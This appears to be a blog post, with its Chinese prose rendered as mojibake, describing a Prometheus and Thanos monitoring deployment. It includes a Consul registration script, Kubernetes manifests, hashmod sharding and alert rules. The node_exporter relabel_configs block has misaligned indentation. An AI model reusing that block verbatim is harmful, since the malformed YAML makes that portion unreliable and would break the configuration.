ä»¥å®Œæ•´é…ç½®æ‹‰å–ç¤ºä¾‹:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¯¹äºthanosçš„æ•°æ®å†™å…¥æä¾›å†™å…¥é˜¿é‡Œäº‘OSSç¤ºä¾‹&lt;/li&gt;
&lt;li&gt;å¯¹äºnode_exporteræ•°æ®æå– çº¿ä¸Šé™¤K8Så¤–çš†ä½¿ç”¨consulä½œä¸ºé…ç½®æ³¨å†Œå’Œå‘ç°&lt;/li&gt;
&lt;li&gt;å¯¹äºä¸šåŠ¡è‡ªå®šä¹‰åŸºäºK8SåšæœåŠ¡å‘ç°å’Œæ‹‰å–&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ä¸»æœºå‘½åè§„åˆ™&#34;&gt;ä¸»æœºå‘½åè§„åˆ™&lt;/h2&gt;
&lt;p&gt;æœºæˆ¿-ä¸šåŠ¡çº¿-ä¸šåŠ¡å±æ€§-åºåˆ—æ•° (ä¾‹:bja-athena-etcd-001)&lt;/p&gt;
&lt;h2 id=&#34;consulè‡ªåŠ¨æ³¨å†Œç¤ºä¾‹è„šæœ¬&#34;&gt;consulè‡ªåŠ¨æ³¨å†Œç¤ºä¾‹è„šæœ¬&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
  
#ip=$(ip addr show eth0|grep inet | awk &#39;{ print $2; }&#39; | sed &#39;s/\/.*$//&#39;)
ip=$(ip addr | egrep -o &#39;[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}&#39; | egrep &amp;quot;^192\.168|^172\.21|^10\.101|^10\.100&amp;quot; | egrep -v &amp;quot;\.255$&amp;quot; | awk -F. &#39;{print $1&amp;quot;.&amp;quot;$2&amp;quot;.&amp;quot;$3&amp;quot;.&amp;quot;$4}&#39; | head -n 1)
ahost=`echo $HOSTNAME`
idc=$(echo $ahost|awk -F &amp;quot;-&amp;quot; &#39;{print $1}&#39;)
app=$(echo $ahost|awk -F &amp;quot;-&amp;quot; &#39;{print $2}&#39;)
group=$(echo $ahost|awk -F &amp;quot;-&amp;quot; &#39;{print $3}&#39;)

if [ &amp;quot;$app&amp;quot; != &amp;quot;test&amp;quot; ]
then
echo &amp;quot;success&amp;quot;
curl -X PUT -d &amp;quot;{\&amp;quot;ID\&amp;quot;: \&amp;quot;${ahost}_${ip}_node\&amp;quot;, \&amp;quot;Name\&amp;quot;: \&amp;quot;node_exporter\&amp;quot;, \&amp;quot;Address\&amp;quot;: \&amp;quot;${ip}\&amp;quot;, \&amp;quot;tags\&amp;quot;: [\&amp;quot;idc=${idc}\&amp;quot;,\&amp;quot;group=${group}\&amp;quot;,\&amp;quot;app=${app}\&amp;quot;,\&amp;quot;server=${ahost}\&amp;quot;], \&amp;quot;Port\&amp;quot;: 9100,\&amp;quot;checks\&amp;quot;: [{\&amp;quot;tcp\&amp;quot;:\&amp;quot;${ip}:9100\&amp;quot;,\&amp;quot;interval\&amp;quot;: \&amp;quot;60s\&amp;quot;}]}&amp;quot; http://consul_server:8500/v1/agent/service/register
fi

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å®Œæ•´é…ç½®æ–‡ä»¶ç¤ºä¾‹&#34;&gt;å®Œæ•´é…ç½®æ–‡ä»¶ç¤ºä¾‹&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus-config
  namespace: monitoring
data:
  bucket.yaml: |
    type: S3
    config:
      bucket: &amp;quot;gcl-download&amp;quot;
      endpoint: &amp;quot;gcl-download.oss-cn-beijing.aliyuncs.com&amp;quot;
      access_key: &amp;quot;xxxxxxxxxxxxxx&amp;quot;
      insecure: false
      signature_version2: false
      secret_key: &amp;quot;xxxxxxxxxxxxxxxxxx&amp;quot;
      http_config:
        idle_conn_timeout: 0s

  prometheus.yml: |
    global:
      scrape_interval:     15s
      evaluation_interval: 15s

      external_labels:
         monitor: &#39;k8s-sh-prod&#39;
         service: &#39;k8s-all&#39;
         ID: &#39;ID_NUM&#39;
         
    remote_write:
      - url: &amp;quot;http://vmstorage:8400/insert/0/prometheus/&amp;quot;
    remote_read:
      - url: &amp;quot;http://vmstorage:8401/select/0/prometheus&amp;quot;
         
    scrape_configs:
    - job_name: &#39;kubernetes-apiservers&#39;
      kubernetes_sd_configs:
      - role: endpoints
      scheme: https
      tls_config:
        ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
      relabel_configs:
      - source_labels: [__meta_kubernetes_namespace, __meta_kubernetes_service_name, __meta_kubernetes_endpoint_port_name]
        action: keep
        regex: default;kubernetes;https 
   
    - job_name: &#39;kubernetes-cadvisor&#39;
      kubernetes_sd_configs:
      - role: node
      scheme: https
      tls_config:
        #ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        insecure_skip_verify: true
      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
      #bearer_token: monitoring
      relabel_configs:
      - action: labelmap
        regex: __meta_kubernetes_node_label_(.+)
      - source_labels: [__meta_kubernetes_node_address_InternalIP]
        regex: (.+)
        target_label: __address__
        replacement: ${1}:10250
      - source_labels: [__meta_kubernetes_node_name]
        regex: (.+)
        target_label: __metrics_path__
        replacement: /metrics/cadvisor
      - source_labels: [__meta_kubernetes_node_name]
        modulus:       10
        target_label:  __tmp_hash
        action:        hashmod
      - source_labels: [__tmp_hash]
        regex:         ID_NUM
        action:        keep
      metric_relabel_configs:
      - source_labels: [container]
        regex: (.+)
        target_label: container_name
        replacement: $1
        action: replace
      - source_labels: [pod]
        regex: (.+)
        target_label: pod_name
        replacement: $1
        action: replace
    
    - job_name: &#39;kubernetes-nodes&#39;
      kubernetes_sd_configs:
      - role: node
      scheme: https
      tls_config:
        #ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        insecure_skip_verify: true
      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
      #bearer_token: monitoring
      relabel_configs:
      - action: labelmap
        regex: __meta_kubernetes_node_label_(.+)
      - source_labels: [__meta_kubernetes_node_address_InternalIP]
        regex: (.+)
        target_label: __address__
        replacement: ${1}:10250
      - source_labels: [__meta_kubernetes_node_name]
        regex: (.+)
        target_label: __metrics_path__
        replacement: /metrics
      - source_labels: [__meta_kubernetes_node_name]
        modulus:       10
        target_label:  __tmp_hash
        action:        hashmod
      - source_labels: [__tmp_hash]
        regex:         ID_NUM
        action:        keep
      metric_relabel_configs:
      - source_labels: [container]
        regex: (.+)
        target_label: container_name
        replacement: $1
        action: replace
      - source_labels: [pod]
        regex: (.+)
        target_label: pod_name
        replacement: $1
        action: replace

    - job_name: &#39;kubernetes-service-endpoints&#39;
      kubernetes_sd_configs:
      - role: endpoints
        namespaces:
          names:
          - monitoring
      relabel_configs:
      - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape]
        action: keep
        regex: true
      - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scheme]
        action: replace
        target_label: __scheme__
        regex: (https?)
      - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path]
        action: replace
        target_label: __metrics_path__
        regex: (.+)
      - source_labels: [__address__, __meta_kubernetes_service_annotation_prometheus_io_port]
        action: replace
        target_label: __address__
        regex: ([^:]+)(?::\d+)?;(\d+)
        replacement: $1:$2
      - action: labelmap
        regex: __meta_kubernetes_service_label_(.+)
      - source_labels: [__meta_kubernetes_namespace]
        action: replace
        target_label: kubernetes_namespace
      - source_labels: [__meta_kubernetes_service_name]
        action: replace
        target_label: kubernetes_name

    - job_name: &#39;kubernetes-pods&#39;
      kubernetes_sd_configs:
      - role: pod
        namespaces:
          names:
          - default
      relabel_configs:
      - action: labelmap
        regex: __meta_kubernetes_pod_label_(.+)
      - source_labels: [__meta_kubernetes_namespace]
        action: replace
        target_label: kubernetes_namespace
      - source_labels: [__meta_kubernetes_pod_name]
        action: replace
        target_label: kubernetes_pod_name

    - job_name: &#39;ingress-nginx-endpoints&#39;
      kubernetes_sd_configs:
      - role: pod
        namespaces:
          names:
          - nginx-ingress
      relabel_configs:
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
        action: keep
        regex: true
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scheme]
        action: replace
        target_label: __scheme__
        regex: (https?)
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
        action: replace
        target_label: __metrics_path__
        regex: (.+)
      - source_labels: [__address__, __meta_kubernetes_pod_annotation_prometheus_io_port]
        action: replace
        target_label: __address__
        regex: ([^:]+)(?::\d+)?;(\d+)
        replacement: $1:$2

    - job_name: &#39;node_exporter&#39;
      consul_sd_configs:
      - server: &#39;consul_server:8500&#39;
      relabel_configs:
          - source_labels: [__address__]
          modulus:       10
          target_label:  __tmp_hash
          action:        hashmod
          - source_labels: [__tmp_hash]
          regex:         ID_NUM
          action:        keep
          - source_labels: [__tmp_hash]
          regex:       &#39;(.*)&#39;
          replacement: &#39;${1}&#39;
          target_label: hash_num
          - source_labels: [__meta_consul_tags]
          regex: .*test.*
          action: drop
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){0}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){1}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){2}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){3}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){4}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){5}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){6}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;
          - source_labels: [__meta_consul_tags]
          regex: &#39;,(?:[^,]+,){7}([^=]+)=([^,]+),.*&#39;
          replacement: &#39;${2}&#39;
          target_label: &#39;${1}&#39;

    - job_name: &#39;è‡ªå®šä¹‰ä¸šåŠ¡ç›‘æ§&#39;
      proxy_url: http://127.0.0.1:8888   #æ ¹æ®ä¸šåŠ¡å±æ€§
      scrape_interval: 5s
      metrics_path: &#39;/&#39;  #æ ¹æ®ä¸šåŠ¡æä¾›è·¯å¾„
      params:   ##æ ¹æ®ä¸šåŠ¡å±æ€§æ˜¯å¦å¸¦æœ‰
        method: [&#39;get&#39;]  
      kubernetes_sd_configs:
      - role: pod
      relabel_configs:
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
        action: keep
        regex: true
      - source_labels: [__address__, __meta_kubernetes_pod_annotation_prometheus_io_port]
        action: replace
        target_label: __address__
        regex: ([^:]+)(?::\d+)?;(\d+)
        replacement: $1:$2
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_name_label]
        action: keep
        regex: monitor  #ä¸šåŠ¡è‡ªå®šä¹‰label
      - action: labelmap
        regex: __meta_kubernetes_pod_label_(.+)
      - source_labels: [__meta_kubernetes_pod_name]
        action: keep
        regex: (.*)
      - source_labels: [__meta_kubernetes_namespace]
        action: replace
        target_label: kubernetes_namespace
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;è‡ªå®šä¹‰ä¸šåŠ¡æ‹‰å–æ ‡è¯†å¯é›†æˆcicd&#34;&gt;è‡ªå®šä¹‰ä¸šåŠ¡æ‹‰å–æ ‡è¯†(å¯é›†æˆCICD)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;  template:
    metadata:
      annotations:
        prometheus.io/port: &amp;quot;port&amp;quot; #ä¸šåŠ¡ç«¯å£
        prometheus.io/scrape: &amp;quot;true&amp;quot;
        prometheus.name/label: monitor  #è‡ªå®šä¹‰æ ‡ç­¾
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;hashmodé…ç½®æ–¹å¼&#34;&gt;hashmodé…ç½®æ–¹å¼ï¼š&lt;/h2&gt;
&lt;h3 id=&#34;1é’ˆå¯¹å®˜æ–¹çš„é•œåƒæ–°å¢hashmodæ¨¡å—åˆ†é…å€¼&#34;&gt;1.é’ˆå¯¹å®˜æ–¹çš„é•œåƒæ–°å¢hashmodæ¨¡å—åˆ†é…å€¼&lt;/h3&gt;
&lt;p&gt;Dockerfile:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FROM  prometheus/prometheus:2.20.0
MAINTAINER name gecailong

COPY ./entrypoint.sh /bin

ENTRYPOINT [&amp;quot;/bin/entrypoint.sh&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;entrypoint.shï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/sh

ID=${POD_NAME##*-}

cp /etc/prometheus/prometheus.yml /prometheus/prometheus-hash.yml

sed -i &amp;quot;s/ID_NUM/$ID/g&amp;quot; /prometheus/prometheus-hash.yml

/bin/prometheus --config.file=/prometheus/prometheus-hash.yml --query.max-concurrency=20 --storage.tsdb.path=/prometheus --storage.tsdb.max-block-duration=2h --storage.tsdb.min-block-duration=2h  --storage.tsdb.retention=2h --web.listen-address=:9090 --web.enable-lifecycle --web.enable-admin-api
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;IDNUMï¼š ä¸ºæˆ‘ä»¬åé¢é…ç½®åšå‡†å¤‡_&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;2prometheuséƒ¨ç½²&#34;&gt;2.Prometheuséƒ¨ç½²&lt;/h3&gt;
&lt;p&gt;Prometheusé…ç½®æ–‡ä»¶:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  prometheus.yml: |
      external_labels:
         monitor: &#39;k8s-sh-prod&#39;
         service: &#39;k8s-all&#39;
         ID: &#39;ID_NUM&#39;
         ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªIDæ˜¯ä¸ºäº†æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å¯ä»¥åŒºåˆ†åŒæ—¶ä¹Ÿå¯ä»¥ä½œä¸ºç­‰ä¸‹hashmodæ¨¡å—çš„å¯¹åº”å€¼&lt;br&gt;
éƒ¨ç½²æ–‡ä»¶:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  labels:
    app: prometheus
  name: prometheus-sts
  namespace: monitoring
spec:
  serviceName: &amp;quot;prometheus&amp;quot;
  replicas: 10 #hashmodæ€»æ¨¡å—æ•°
  selector:
    matchLabels:
      app: prometheus
  template:
    metadata:
      labels:
        app: prometheus
    spec:
      containers:
      - image: gecailong/prometheus-hash:0.0.1
        name: prometheus
        securityContext:
           runAsUser: 0
        command:
        - &amp;quot;/bin/entrypoint.sh&amp;quot;
        env:
        - name: POD_NAME  #æ ¹æ®statefulsetçš„ç‰¹æ€§ä¼ å…¥PODåç§°ç”¨äºæ¨¡å—å–å€¼
          valueFrom:
            fieldRef:
              apiVersion: v1
              fieldPath: metadata.name
        ports:
        - name: http
          containerPort: 9090
          protocol: TCP
        volumeMounts:
        - mountPath: &amp;quot;/etc/prometheus&amp;quot;
          name: config-volume
        - mountPath: &amp;quot;/prometheus&amp;quot;
          name: data
        resources:
          requests:
            cpu: 500m
            memory: 1000Mi
          limits:
            memory: 2000Mi
      - image: gecailong/prometheus-thanos:v0.17.1
        name: sidecar
        imagePullPolicy: IfNotPresent
        args:
        - &amp;quot;sidecar&amp;quot;
        - &amp;quot;--grpc-address=0.0.0.0:10901&amp;quot;
        - &amp;quot;--grpc-grace-period=1s&amp;quot;
        - &amp;quot;--http-address=0.0.0.0:10902&amp;quot;
        - &amp;quot;--http-grace-period=1s&amp;quot;
        - &amp;quot;--prometheus.url=http://127.0.0.1:9090&amp;quot;
        - &amp;quot;--tsdb.path=/prometheus&amp;quot;
        - &amp;quot;--log.level=info&amp;quot;
        - &amp;quot;--objstore.config-file=/etc/prometheus/bucket.yaml&amp;quot;
        ports:
        - name: http-sidecar
          containerPort: 10902
        - name: grpc-sidecar
          containerPort: 10901
        volumeMounts:
        - mountPath: &amp;quot;/etc/prometheus&amp;quot;
          name: config-volume
        - mountPath: &amp;quot;/prometheus&amp;quot;
          name: data
      serviceAccountName: prometheus
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
      imagePullSecrets: 
        - name: regsecret
      volumes:
      - name: config-volume
        configMap:
          name: prometheus-config
      - name: data
        hostPath:
          path: /data/prometheus
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;æ•°æ®èšåˆ&#34;&gt;æ•°æ®èšåˆ&lt;/h1&gt;
&lt;p&gt;Thanosæˆ‘ä»¬ä»18å¹´ä¸€å¼€å§‹å°±ç”¨çš„å®ƒï¼Œè™½ç„¶ä¸€å¼€å§‹çš„ç‰ˆæœ¬æœ‰å¾ˆå¤šbugä¹Ÿç»™æˆ‘ä»¬å¸¦æ¥äº†å¾ˆå¤šå›°æ‰°,åŒæ—¶æˆ‘ä»¬ä¹Ÿæäº†å¾ˆå¤šçš„issueï¼Œæ…¢æ…¢çš„ç¨³å®šä¹‹åï¼Œæˆ‘ä»¬åœ¨æ­¤ä¹‹å‰çº¿ä¸Šéƒ½æ˜¯ä½¿ç”¨v0.2.1ç‰ˆæœ¬è¿›è¡Œçº¿ä¸Šé•¿æœŸä½¿ç”¨,æœ€æ–°çš„ç‰ˆæœ¬å·²ç»å»é™¤äº†åŸºäºgrpc clusteræœåŠ¡å‘ç°çš„åŠŸèƒ½ï¼ŒUIä¹Ÿæ›´åŠ çš„ä¸°å¯Œã€‚ğŸ˜€æˆ‘ä»¬ä¹Ÿè¿›è¡Œäº†ç›‘æ§å¹³å°æ¶æ„é‡æ„&lt;br&gt;
æˆ‘ä»¬æ•°æ®èšåˆé‡‡ç”¨Thanosè¿›è¡ŒæŸ¥è¯¢æ•°æ®èšåˆï¼ŒåŒæ—¶åé¢æˆ‘ä»¬æåˆ°çš„æ•°æ®å­˜å‚¨ç»„ä»¶victoriametricsä¹Ÿå¯ä»¥å®ç°æ•°æ®èšåˆçš„åŠŸèƒ½ï¼Œé’ˆå¯¹Thanosï¼Œæˆ‘ä»¬ä¸»è¦ä½¿ç”¨å®ƒçš„å‡ ä¸ªå­ç»„ä»¶ï¼šqueryã€sidecarã€ruleï¼Œè‡³äºå…¶ä»–çš„ç»„ä»¶å¦‚compactã€storeã€bucketç­‰ä¾æ®è‡ªå·±çš„ä¸šåŠ¡æ²¡æœ‰è¿›è¡Œä½¿ç”¨.&lt;br&gt;
æˆ‘ä»¬çš„Thanos+Prometheusçš„æ¶æ„å›¾å·²åœ¨å¼€å¤´å±•ç¤ºï¼Œä»¥ä¸‹ä»…ç»™å‡ºéƒ¨ç½²å’Œæ³¨æ„äº‹é¡¹:&lt;br&gt;
Thanosç»„ä»¶éƒ¨ç½²:&lt;br&gt;
sidecar:(æˆ‘ä»¬é‡‡ç”¨å’ŒPrometheusæ”¾åœ¨åŒä¸€POD)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;      - image: gecailong/prometheus-thanos:v0.17.1
        name: thanos
        imagePullPolicy: IfNotPresent
        args:
        - &amp;quot;sidecar&amp;quot;
        - &amp;quot;--grpc-address=0.0.0.0:10901&amp;quot;
        - &amp;quot;--grpc-grace-period=1s&amp;quot;
        - &amp;quot;--http-address=0.0.0.0:10902&amp;quot;
        - &amp;quot;--http-grace-period=1s&amp;quot;
        - &amp;quot;--prometheus.url=http://127.0.0.1:9090&amp;quot;
        - &amp;quot;--tsdb.path=/prometheus&amp;quot;
        - &amp;quot;--log.level=info&amp;quot;
        - &amp;quot;--objstore.config-file=/etc/prometheus/bucket.yaml&amp;quot;
        ports:
        - name: http-sidecar
          containerPort: 10902
        - name: grpc-sidecar
          containerPort: 10901
        env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        volumeMounts:
        - mountPath: &amp;quot;/etc/prometheus&amp;quot;
          name: config-volume
        - mountPath: &amp;quot;/prometheus&amp;quot;
          name: data
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;queryç»„ä»¶éƒ¨ç½²:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  labels:
    app: query
  name: thanos-query
  namespace: monitoring
spec:
  replicas: 3
  selector:
    matchLabels:
      app: query
  template:
    metadata:
      labels:
        app: query
    spec:
      containers:
      - image: gecailong/prometheus-thanos:v0.17.1
        name: query
        imagePullPolicy: IfNotPresent
        args:
        - &amp;quot;query&amp;quot;
        - &amp;quot;--http-address=0.0.0.0:19090&amp;quot;
        - &amp;quot;--grpc-address=0.0.0.0:10903&amp;quot;
        - &amp;quot;--store=dnssrv+_grpc._tcp.prometheus-sidecar-svc.monitoring.svc.cluster.local&amp;quot;
        - &amp;quot;--store=dnssrv+_grpc._tcp.sidecar-query.monitoring.svc.cluster.local&amp;quot;
        - &amp;quot;--store=dnssrv+_grpc._tcp.sidecar-rule.monitoring.svc.cluster.local&amp;quot;
        ports:
        - name: http-query
          containerPort: 19090
        - name: grpc-query
          containerPort: 10903
        env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ruleç»„ä»¶éƒ¨ç½²:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  labels:
    app: query
  name: thanos-rule
  namespace: monitoring
spec:
  replicas: 2
  serviceName: &amp;quot;sidecar-rule&amp;quot;
  selector:
    matchLabels:
      app: rule
  template:
    metadata:
      labels:
        app: rule
    spec:
      containers:
      - image: gecailong/prometheus-thanos:v0.17.1
        name: rule
        imagePullPolicy: IfNotPresent
        args:
        - &amp;quot;rule&amp;quot;
        - &amp;quot;--http-address=0.0.0.0:10902&amp;quot;
        - &amp;quot;--grpc-address=0.0.0.0:10901&amp;quot;
        - &amp;quot;--data-dir=/data&amp;quot;
        - &amp;quot;--rule-file=/prometheus-rules/*.yaml&amp;quot;
        - &amp;quot;--alert.query-url=http://sidecar-query:19090&amp;quot;
        - &amp;quot;--alertmanagers.url=http://alertmanager:9093&amp;quot;
        - &amp;quot;--query=http://sidecar-query:19090&amp;quot;
        env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        volumeMounts:
        - mountPath: &amp;quot;/prometheus-rules&amp;quot;
          name: config-volume
        - mountPath: &amp;quot;/data&amp;quot;
          name: data
        resources:
          requests:
            cpu: 100m
            memory: 100Mi
          limits:
            memory: 1500Mi
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
      volumes:
      - name: config-volume
        configMap:
          name: prometheus-rule
      - name: data
        hostPath:
          path: /data/prometheus
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ruleé€šç”¨å‘Šè­¦è§„åˆ™å’Œé…ç½®:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus-rule
  namespace: monitoring
data:
  k8s_cluster_rule.yaml: |+
    groups:
    - name: pod_etcd_monitor
      rules:
      - alert: pod_etcd_num_is_changing
        expr: sum(kube_pod_info{pod=~&amp;quot;etcd.*&amp;quot;})by(monitor) &amp;lt; 3
        for: 1m
        labels:
          level: high
          service: etcd
        annotations:
          summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},etcdé›†ç¾¤podä½äºæ­£å¸¸æ€»æ•°&amp;quot;
          description: &amp;quot;æ€»æ•°ä¸º3,å½“å‰å€¼æ˜¯{{ $value}}&amp;quot;
    - name: pod_scheduler_monitor
      rules:
      - alert: pod_scheduler_num_is_changing
        expr: sum(kube_pod_info{pod=~&amp;quot;kube-scheduler.*&amp;quot;})by(monitor) &amp;lt; 3
        for: 1m
        labels:
          level: high
          service: scheduler
        annotations:
          summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},scheduleré›†ç¾¤podä½äºæ­£å¸¸æ€»æ•°&amp;quot;
          description: &amp;quot;æ€»æ•°ä¸º3,å½“å‰å€¼æ˜¯{{ $value}}&amp;quot;
    - name: pod_controller_monitor
      rules:
      - alert: pod_controller_num_is_changing
        expr: sum(kube_pod_info{pod=~&amp;quot;kube-controller-manager.*&amp;quot;})by(monitor) &amp;lt; 3
        for: 1m
        labels:
          level: high
          service: controller
        annotations:
          summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},controlleré›†ç¾¤podä½äºæ­£å¸¸æ€»æ•°&amp;quot;
          description: &amp;quot;æ€»æ•°ä¸º3,å½“å‰å€¼æ˜¯{{ $value}}&amp;quot;
    - name: pod_apiserver_monitor
      rules:
      - alert: pod_apiserver_num_is_changing
        expr: sum(kube_pod_info{pod=~&amp;quot;kube-apiserver.*&amp;quot;})by(monitor) &amp;lt; 3
        for: 1m
        labels:
          level: high
          service: controller
        annotations:
          summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},apiserveré›†ç¾¤podä½äºæ­£å¸¸æ€»æ•°&amp;quot;
          description: &amp;quot;æ€»æ•°ä¸º3,å½“å‰å€¼æ˜¯{{ $value}}&amp;quot;

  k8s_master_resource_rules.yaml: |+
    groups:
    - name: node_cpu_resource_monitor
      rules:
      - alert: èŠ‚ç‚¹CPUä½¿ç”¨é‡
        expr:  sum(kube_pod_container_resource_requests_cpu_cores{node=~&amp;quot;.*&amp;quot;})by(node)/sum(kube_node_status_capacity_cpu_cores{node=~&amp;quot;.*&amp;quot;})by(node)&amp;gt;0.7
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤NODEèŠ‚ç‚¹æ€»çš„CPUä½¿ç”¨æ ¸æ•°å·²ç»è¶…è¿‡äº†70%&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},èŠ‚ç‚¹:{{ $labels.node }}å½“å‰å€¼ä¸º{{ $value }}!&amp;quot;
    - name: node_memory_resource_monitor
      rules:
      - alert: èŠ‚ç‚¹å†…å­˜ä½¿ç”¨é‡
        expr:  sum(kube_pod_container_resource_limits_memory_bytes{node=~&amp;quot;.*&amp;quot;})by(node)/sum(kube_node_status_capacity_memory_bytes{node=~&amp;quot;.*&amp;quot;})by(node)&amp;gt;0.7
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤NODEèŠ‚ç‚¹æ€»çš„memoryä½¿ç”¨æ ¸æ•°å·²ç»è¶…è¿‡äº†70%&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},èŠ‚ç‚¹:{{ $labels.node }}å½“å‰å€¼ä¸º{{ $value }}!&amp;quot;
    - name: èŠ‚ç‚¹PODä½¿ç”¨ç‡
      rules:
      - alert: èŠ‚ç‚¹podä½¿ç”¨ç‡
        expr: sum by(node,monitor) (kube_pod_info{node=~&amp;quot;.*&amp;quot;}) / sum by(node,monitor) (kube_node_status_capacity_pods{node=~&amp;quot;.*&amp;quot;})&amp;gt; 0.9
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤NODEèŠ‚ç‚¹æ€»çš„PODä½¿ç”¨æ•°é‡å·²ç»è¶…è¿‡äº†90%&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},èŠ‚ç‚¹:{{ $labels.node }}å½“å‰å€¼ä¸º{{ $value }}!&amp;quot;      
    - name: master_cpu_used
      rules:
      - alert: ä¸»èŠ‚ç‚¹CPUä½¿ç”¨ç‡
        expr:  sum(kube_pod_container_resource_limits_cpu_cores{node=~&#39;master.*&#39;})by(node)/sum(kube_node_status_capacity_cpu_cores{node=~&#39;master.*&#39;})by(node)&amp;gt;0.7
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤MasterèŠ‚ç‚¹æ€»çš„CPUç”³è¯·æ ¸æ•°å·²ç»è¶…è¿‡äº†0.7,å½“å‰å€¼ä¸º{{ $value }}!&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},èŠ‚ç‚¹:{{ $labels.node }}å½“å‰å€¼ä¸º{{ $value }}!&amp;quot; 
    - name: master_memory_resource_monitor
      rules:
      - alert: ä¸»èŠ‚ç‚¹å†…å­˜ä½¿ç”¨ç‡
        expr:  sum(kube_pod_container_resource_limits_memory_bytes{node=~&#39;master.*&#39;})by(node)/sum(kube_node_status_capacity_memory_bytes{node=~&#39;master.*&#39;})by(node)&amp;gt;0.7
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤MasterèŠ‚ç‚¹æ€»çš„å†…å­˜ä½¿ç”¨é‡å·²ç»è¶…è¿‡äº†70%&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},èŠ‚ç‚¹:{{ $labels.node }}å½“å‰å€¼ä¸º{{ $value }}!&amp;quot;
